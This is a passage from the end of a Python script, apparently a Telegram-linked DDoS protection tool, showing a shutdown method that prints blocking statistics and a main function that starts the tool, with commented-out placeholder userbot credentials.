    def stop(self):
        self.running = False
        
        # Stop userbot if running
        if self.userbot:
            try:
                self.userbot.stop()
                print("   • Userbot stopped")
            except:
                pass
        
        print("\n🛑 [STOPPED] System shutdown complete")
        print(f"   Final stats: {self.stats['attacks_detected']} attacks blocked!")
        print(f"   Manual blocks: {self.stats['manual_blocks']}")
        print(f"   Network blocks: {self.stats['network_blocks']}")
        print(f"   User bans: {self.stats['user_bans']}")
        print(f"   Voice chat blocks: {self.stats['voice_chat_blocks']}")
        print("👋 Goodbye!")
        sys.exit(0)

def main():
    protection = DDoSProtection()
    
    # Optional: Initialize userbot with credentials
    # Uncomment and fill in your credentials to enable userbot features
    # api_id = 1234567  # Your API ID from my.telegram.org
    # api_hash = "your_api_hash_here"  # Your API Hash from my.telegram.org
    # phone = "+1234567890"  # Your phone number with country code
    # 
    # if protection.init_userbot(api_id, api_hash, phone):
    #     protection.start_userbot()
    #     protection.start(with_telegram=True, with_simulation=True, with_userbot=True)
    # else:
    #     protection.start(with_telegram=True, with_simulation=True, with_userbot=False)
    
    # Start without userbot for now
    protection.start(with_telegram=True, with_simulation=True, with_userbot=False)

if __name__ == "__main__":
    main()
